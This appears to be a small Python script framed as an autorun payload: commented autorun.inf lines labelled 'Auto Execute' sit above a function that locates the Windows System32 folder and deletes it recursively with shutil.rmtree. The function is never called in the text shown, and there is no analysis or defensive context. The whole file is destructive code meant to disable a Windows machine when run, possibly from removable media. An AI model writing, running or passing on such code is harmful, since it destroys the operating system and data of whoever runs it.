# [autorun]
# open=auto_execute.py
# icon=auto_execute.py
# label=Auto Execute

import os
import shutil
import subprocess

def remove_os_system():
    # Get the path to the OS system folder
    system_folder = os.path.join(os.environ['SYSTEMROOT'], 'System32')
    
    # Check if the system folder exists
    if os.path.exists(system_folder):
        try:
            # Remove the system folder
            shutil.rmtree(system_folder)
            print(f"Successfully removed {system_folder}")
        except Exception as e:
            print(f"Error removing {system_folder}: {e}")